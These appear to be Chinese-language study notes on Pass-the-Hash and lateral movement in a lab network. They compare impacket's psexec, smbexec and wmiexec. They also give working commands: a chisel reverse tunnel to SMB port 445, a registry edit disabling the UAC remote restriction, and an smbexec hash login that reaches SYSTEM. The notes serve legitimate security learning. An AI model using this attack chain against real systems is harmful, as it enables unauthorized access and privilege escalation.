# PTH 与横向移动学习笔记

## 1. 什么是 PTH

Pass The Hash，即哈希传递。

攻击者不需要知道明文密码，只要拿到目标账户的 NTLM 哈希，就可以通过 SMB 登录目标机器。

## 2. 核心条件

- 目标开放 445 端口
- 有有效账户的 NTLM 哈希
- Kali 能够访问目标 445

## 3. 常见工具

| 工具 | 端口 | 特点 |
| ---- | ---- | ---- |
| impacket-psexec | 445 | 需要 ADMIN$ 可写 |
| impacket-wmiexec | 135 + 动态RPC | 需要 WMI 放行 |
| impacket-smbexec | 445 | 最稳定，不创建服务 |

## 4. psexec 流程

1. 连接目标 ADMIN$
2. 上传后门程序
3. 创建服务
4. 启动服务
5. 返回 shell

## 5. smbexec 流程

1. 通过 SMB 执行命令
2. 不创建服务
3. 隐蔽性更好

## 6. wmiexec 流程

1. 通过 WMI 创建进程
2. 不写文件
3. 网络要求高

## 7. 实战环境

| 主机 | IP | 角色 |
| ---- | ---- | ---- |
| Kali | 10.0.0.131 | 攻击机 |
| CentOS | 10.0.0.132 | 跳板 |
| Windows | 10.0.0.129 | 目标机 |

## 8. 实战流程

1. Kali 无法直连 Windows 445
2. CentOS 可以访问 Windows 445
3. 使用 chisel 将 Windows 445 映射到 Kali 本地
4. 修改 Windows UAC 远程限制
5. 使用 smbexec 成功 PTH
6. 获得 SYSTEM 权限

## 9. 常用命令

### chisel 映射 445

```bash
./chisel client 10.0.0.131:7001 R:445:10.0.0.129:445
```

### 关闭 UAC 远程限制

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### PTH 执行

```bash
impacket-smbexec -hashes NTLM:NTLM test@127.0.0.1
```

## 10. 总结

PTH 是内网横向移动的核心技术。  
smbexec 因为只依赖 445 端口，是实战中成功率最高的方式之一。
